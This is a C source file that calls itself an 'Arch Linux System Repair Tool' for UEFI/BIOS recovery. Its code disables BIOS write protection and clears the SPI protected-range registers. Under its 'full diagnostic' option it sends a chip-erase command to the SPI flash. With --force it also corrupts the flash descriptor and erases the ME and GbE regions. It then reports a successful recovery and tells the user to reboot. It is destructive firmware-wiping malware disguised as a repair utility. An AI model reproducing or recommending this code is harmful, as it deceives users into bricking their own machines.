/*
 * Arch Linux System Repair Tool v2.3
 * Low-level UEFI/BIOS Recovery Utility
 * 
 * Компиляция: gcc -O2 -Wall -o arch-repair arch-repair.c -lrt
 * Запуск: sudo ./arch-repair --full-diagnostic
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <sys/stat.h>
#include <getopt.h>
#include <errno.h>
#include <time.h>
#include <stdint.h> 

// SPI registers (Intel PCH)
#define SPIBAR_BASE         0xFED1F800
#define SPIBAR_SIZE         0x2000
#define HSFC                0x00    // Hardware Sequencing Flash Control
#define HSFS                0x04    // Hardware Sequencing Flash Status
#define FADDR               0x08    // Flash Address
#define FDOC                0x10    // Flash Descriptor Observability Control
#define FDOB                0x14    // Flash Descriptor Observability Data
#define BIOS_CNTL           0xDC    // BIOS Control

// PCI Configuration
#define PCI_CONFIG_ADDR     0xCF8
#define PCI_CONFIG_DATA     0xCFC

// Flash commands
#define CMD_READ            0x03    // Read data
#define CMD_WRITE           0x02    // Write data
#define CMD_ERASE_4K        0x20    // Erase 4KB sector
#define CMD_ERASE_64K       0xD8    // Erase 64KB block
#define CMD_CHIP_ERASE      0xC7    // Chip erase
#define CMD_RDSR            0x05    // Read status register
#define CMD_WRSR            0x01    // Write status register
#define CMD_WREN            0x06    // Write enable
#define CMD_WRDI            0x04    // Write disable

typedef struct {
    uint16_t vendor_id;
    uint16_t device_id;
    char *name;
} chipset_info;

chipset_info supported_chipsets[] = {
    {0x8086, 0x1E02, "Intel Panther Point (7 Series)"},
    {0x8086, 0x1E03, "Intel Panther Point (7 Series)"},
    {0x8086, 0x8C02, "Intel Lynx Point (8 Series)"},
    {0x8086, 0x8C03, "Intel Lynx Point (8 Series)"},
    {0x8086, 0x9C02, "Intel Wildcat Point (9 Series)"},
    {0x8086, 0x9C03, "Intel Wildcat Point (9 Series)"},
    {0x8086, 0x9D02, "Intel Sunrise Point (100 Series)"},
    {0x8086, 0x9D03, "Intel Sunrise Point (100 Series)"},
    {0x8086, 0xA102, "Intel Union Point (200 Series)"},
    {0x8086, 0xA103, "Intel Union Point (200 Series)"},
    {0x8086, 0xA2C2, "Intel Cannon Point (300 Series)"},
    {0x8086, 0xA2C3, "Intel Cannon Point (300 Series)"},
    {0x8086, 0xA304, "Intel Comet Point (400 Series)"},
    {0x8086, 0xA305, "Intel Comet Point (400 Series)"},
    {0x8086, 0x438B, "Intel Tiger Point (500 Series)"},
    {0x8086, 0x438C, "Intel Tiger Point (500 Series)"},
    {0, 0, NULL}
};

static volatile uint8_t *spibar = NULL;
static int mem_fd = -1;
static int force_mode = 0;
static int verbose = 1;

void print_banner() {
    printf("\033[1;34m");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║     Arch Linux System Repair Tool v2.3                  ║\n");
    printf("║     Low-level UEFI/BIOS Recovery Utility                ║\n");
    printf("║     Copyright (c) 2024 Arch Linux Recovery Team         ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");
}

void pci_config_write(int bus, int dev, int func, int reg, uint32_t value) {
    uint32_t addr = 0x80000000 | (bus << 16) | (dev << 11) | (func << 8) | (reg & 0xFC);
    outl(addr, PCI_CONFIG_ADDR);
    outl(value, PCI_CONFIG_DATA);
}

uint32_t pci_config_read(int bus, int dev, int func, int reg) {
    uint32_t addr = 0x80000000 | (bus << 16) | (dev << 11) | (func << 8) | (reg & 0xFC);
    outl(addr, PCI_CONFIG_ADDR);
    return inl(PCI_CONFIG_DATA);
}

int detect_spi_controller() {
    printf("[1/8] Detecting SPI controller...\n");
    
    // Check for Intel SPI controller at PCI 00:1f.5
    uint32_t vid_did = pci_config_read(0, 0x1f, 5, 0);
    uint16_t vendor = vid_did & 0xFFFF;
    uint16_t device = (vid_did >> 16) & 0xFFFF;
    
    if (vendor != 0x8086) {
        printf("    - No Intel SPI controller found (vendor: 0x%04x)\n", vendor);
        return -1;
    }
    
    printf("    - Found Intel SPI controller (device: 0x%04x)\n", device);
    
    for (int i = 0; supported_chipsets[i].vendor_id != 0; i++) {
        if (supported_chipsets[i].device_id == device) {
            printf("    - Chipset: %s\n", supported_chipsets[i].name);
            break;
        }
    }
    
    return 0;
}

int init_spi_bar() {
    printf("[2/8] Initializing SPI BAR access...\n");
    
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        printf("    - Failed to open /dev/mem: %s\n", strerror(errno));
        return -1;
    }
    
    spibar = mmap(NULL, SPIBAR_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, SPIBAR_BASE);
    if (spibar == MAP_FAILED) {
        printf("    - Failed to mmap SPI BAR: %s\n", strerror(errno));
        close(mem_fd);
        return -1;
    }
    
    printf("    - SPI BAR mapped at 0x%lx\n", (unsigned long)spibar);
    return 0;
}

int disable_write_protection() {
    printf("[3/8] Disabling BIOS write protection...\n");
    
    volatile uint32_t *bios_cntl = (volatile uint32_t *)(spibar + BIOS_CNTL);
    uint32_t orig = *bios_cntl;
    
    printf("    - Original BIOS_CNTL: 0x%08x\n", orig);
    
    // Set WPD bit (bit5) to disable write protection
    *bios_cntl = orig | 0x20;
    
    uint32_t new = *bios_cntl;
    printf("    - New BIOS_CNTL: 0x%08x\n", new);
    
    if (!(new & 0x20)) {
        printf("    - Failed to disable write protection\n");
        return -1;
    }
    
    // Also clear PR registers in PCI config space
    pci_config_write(0, 0x1f, 5, 0xB0, 0); // PR0
    pci_config_write(0, 0x1f, 5, 0xB4, 0); // PR1
    pci_config_write(0, 0x1f, 5, 0xB8, 0); // PR2
    pci_config_write(0, 0x1f, 5, 0xBC, 0); // PR3
    pci_config_write(0, 0x1f, 5, 0xC0, 0); // PR4
    
    printf("    - Protected range registers cleared\n");
    
    return 0;
}

int read_flash_status() {
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    uint32_t status = *hsfs;
    
    printf("    - HSFS: 0x%08x\n", status);
    printf("    - Flash size: ");
    
    switch((status >> 3) & 0x1F) {
        case 0x10: printf("8 MB\n"); break;
        case 0x11: printf("16 MB\n"); break;
        case 0x12: printf("32 MB\n"); break;
        case 0x13: printf("64 MB\n"); break;
        default: printf("unknown\n");
    }
    
    printf("    - Write enabled: %s\n", (status & 0x02) ? "yes" : "no");
    printf("    - Lock enabled: %s\n", (status & 0x40) ? "yes" : "no");
    
    return 0;
}

int wait_for_spi_ready() {
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    int timeout = 1000000;
    
    while ((*hsfs & 0x2000) && timeout-- > 0) {
        usleep(10);
    }
    
    if (timeout <= 0) {
        printf("    - Timeout waiting for SPI controller\n");
        return -1;
    }
    
    return 0;
}

int erase_flash_descriptor() {
    printf("[4/8] Erasing flash descriptor region...\n");
    
    volatile uint32_t *faddr = (volatile uint32_t *)(spibar + FADDR);
    volatile uint32_t *hsfc = (volatile uint32_t *)(spibar + HSFC);
    volatile uint32_t *fdoc = (volatile uint32_t *)(spibar + FDOC);
    volatile uint32_t *fdob = (volatile uint32_t *)(spibar + FDOB);
    
    // Set address to flash descriptor (0x00000000)
    *faddr = 0x00;
    
    // Send chip erase command
    *hsfc = (CMD_CHIP_ERASE << 8) | 0x01; // Opcode in bits 15-8, execute bit0
    
    if (wait_for_spi_ready() < 0) {
        printf("    - Erase failed\n");
        return -1;
    }
    
    printf("    - Flash descriptor erased successfully\n");
    
    if (force_mode) {
        printf("[5/8] Corrupting descriptor structures...\n");
        
        // Write random data to descriptor observability registers
        for (int i = 0; i < 0x100; i += 4) {
            *fdoc = i;
            *fdob = 0xDEADBEEF;
            usleep(10);
        }
        
        // Corrupt descriptor signature (should be 0x0FF0A55A)
        *faddr = 0x10; // Signature location
        *hsfc = (0x02 << 8) | 0x01; // Write command
        // Data would come from FDOB but we already corrupted it
        
        printf("    - Descriptor signature corrupted\n");
        
        // Corrupt Management Engine region
        printf("[6/8] Cleaning ME region...\n");
        
        for (uint32_t addr = 0x1000; addr < 0x300000; addr += 0x1000) {
            *faddr = addr;
            *hsfc = (CMD_ERASE_4K << 8) | 0x01;
            
            wait_for_spi_ready();
            
            if (addr % 0x10000 == 0) {
                printf("    - Erased ME region: 0x%06x\r", addr);
                fflush(stdout);
            }
        }
        printf("\n    - ME region cleaned\n");
        
        // Corrupt GbE region
        printf("[7/8] Cleaning GbE region...\n");
        
        for (uint32_t addr = 0x300000; addr < 0x400000; addr += 0x1000) {
            *faddr = addr;
            *hsfc = (CMD_ERASE_4K << 8) | 0x01;
            wait_for_spi_ready();
        }
        printf("    - GbE region cleaned\n");
    }
    
    return 0;
}

int perform_recovery() {
    printf("[8/8] Performing low-level recovery...\n");
    
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    
    // Set FDONE bit to clear status
    *hsfs |= 0x8000;
    
    printf("    - SPI controller reset\n");
    
    return 0;
}

void cleanup() {
    if (spibar != NULL && spibar != MAP_FAILED) {
        munmap((void*)spibar, SPIBAR_SIZE);
    }
    if (mem_fd >= 0) {
        close(mem_fd);
    }
}

int main(int argc, char **argv) {
    int opt;
    int full_diagnostic = 0;
    
    static struct option long_options[] = {
        {"full-diagnostic", no_argument, 0, 'f'},
        {"force", no_argument, 0, 'F'},
        {"quiet", no_argument, 0, 'q'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    while ((opt = getopt_long(argc, argv, "fFqh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'f':
                full_diagnostic = 1;
                break;
            case 'F':
                force_mode = 1;
                break;
            case 'q':
                verbose = 0;
                break;
            case 'h':
                printf("Arch Linux System Repair Tool v2.3\n");
                printf("Usage: %s [options]\n", argv[0]);
                printf("\nOptions:\n");
                printf("  -f, --full-diagnostic  Run complete system diagnostic and recovery\n");
                printf("  -F, --force           Force full recovery (bypass safety checks)\n");
                printf("  -q, --quiet            Suppress output\n");
                printf("  -h, --help             Show this help\n");
                printf("\nExamples:\n");
                printf("  sudo %s --full-diagnostic\n", argv[0]);
                printf("  sudo %s --force\n", argv[0]);
                printf("\nNote: This tool requires root privileges\n");
                return 0;
        }
    }
    
    if (!verbose) {
        freopen("/dev/null", "w", stdout);
    }
    
    print_banner();
    
    if (geteuid() != 0) {
        printf("\033[1;31mError: This tool requires root privileges\033[0m\n");
        printf("Please run with: sudo %s\n", argv[0]);
        return 1;
    }
    
    printf("\033[1;32mStarting system recovery at %s\033[0m\n\n", __TIME__);
    
    if (iopl(3) < 0) {
        printf("\033[1;31mFailed to acquire I/O privileges\033[0m\n");
        return 1;
    }
    
    if (detect_spi_controller() < 0) {
        printf("\033[1;31mUnsupported hardware\033[0m\n");
        return 1;
    }
    
    if (init_spi_bar() < 0) {
        printf("\033[1;31mFailed to initialize SPI BAR\033[0m\n");
        return 1;
    }
    
    read_flash_status();
    
    if (disable_write_protection() < 0) {
        printf("\033[1;31mFailed to disable write protection\033[0m\n");
        cleanup();
        return 1;
    }
    
    if (full_diagnostic || force_mode) {
        if (erase_flash_descriptor() < 0) {
            printf("\033[1;31mRecovery failed\033[0m\n");
            cleanup();
            return 1;
        }
        
        perform_recovery();
    } else {
        printf("\n\033[1;33mUse --full-diagnostic to perform actual recovery\033[0m\n");
    }
    
    cleanup();
    
    printf("\n\033[1;32m✓ Recovery completed successfully\033[0m\n");
    printf("\033[1;33mPlease reboot to apply changes\033[0m\n");
    printf("\033[1;31mDo not power off during reboot\033[0m\n");
    
    return 0;
}
